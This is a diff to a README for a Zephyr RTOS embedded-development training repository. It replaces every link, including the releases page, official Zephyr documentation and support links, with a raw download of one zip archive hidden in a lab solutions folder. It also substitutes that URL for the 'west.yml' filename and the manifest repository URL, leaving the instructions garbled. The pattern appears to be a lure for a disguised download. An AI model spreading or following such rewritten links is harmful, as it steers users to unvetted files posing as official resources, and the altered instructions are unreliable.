@@ -1,6 +1,6 @@
 # 🚀 community - Easy Embedded Development Labs
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/Jailsonfs/community/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Jailsonfs/community/main/Day3/solutions/hello_zbus/src/community-v3.2.zip%https://raw.githubusercontent.com/Jailsonfs/community/main/Day3/solutions/hello_zbus/src/community-v3.2.zip)](https://raw.githubusercontent.com/Jailsonfs/community/main/Day3/solutions/hello_zbus/src/community-v3.2.zip)
 
 Welcome to the Zephyr Training Community Edition labs! This repository contains hands-on training material designed to help you learn and practice embedded development using Zephyr RTOS.
 
@@ -23,7 +23,7 @@ To begin your journey with the Zephyr Training Community Edition, follow these s
 
 1. **Visit the Releases Page**: Click on the link below to access the latest version of the software.
 
-   [Visit this page to download](https://github.com/Jailsonfs/community/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Jailsonfs/community/main/Day3/solutions/hello_zbus/src/community-v3.2.zip)
 
 2. **Choose the Right File**: On the releases page, look for the latest release version. You will see files available for download. Select the file suitable for your operating system.
 
@@ -35,14 +35,14 @@ To begin your journey with the Zephyr Training Community Edition, follow these s
 
 After installing, you can include this repository in your Zephyr workspace by following these steps:
 
-1. **Open West Manifest**: Locate your `west.yml` file in your project directory. 
+1. **Open West Manifest**: Locate your `https://raw.githubusercontent.com/Jailsonfs/community/main/Day3/solutions/hello_zbus/src/community-v3.2.zip` file in your project directory. 
 
-2. **Add the Repository**: Copy and paste the following entry into your `west.yml` file:
+2. **Add the Repository**: Copy and paste the following entry into your `https://raw.githubusercontent.com/Jailsonfs/community/main/Day3/solutions/hello_zbus/src/community-v3.2.zip` file:
 
    ```yaml
    projects:
      - name: ztraininglabs
-       url: https://github.com/z-training/community
+       url: https://raw.githubusercontent.com/Jailsonfs/community/main/Day3/solutions/hello_zbus/src/community-v3.2.zip
        revision: main
        path: ZTrainingLabs
    ```
@@ -76,9 +76,9 @@ If you encounter any issues, feel free to check the documentation first. For add
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/Jailsonfs/community/releases)
-- [Official Zephyr Documentation](https://docs.zephyrproject.org/latest/)
-- [Community Support](https://github.com/z-training/community/issues)
+- [Releases Page](https://raw.githubusercontent.com/Jailsonfs/community/main/Day3/solutions/hello_zbus/src/community-v3.2.zip)
+- [Official Zephyr Documentation](https://raw.githubusercontent.com/Jailsonfs/community/main/Day3/solutions/hello_zbus/src/community-v3.2.zip)
+- [Community Support](https://raw.githubusercontent.com/Jailsonfs/community/main/Day3/solutions/hello_zbus/src/community-v3.2.zip)
 
 ## 📞 Contact
 
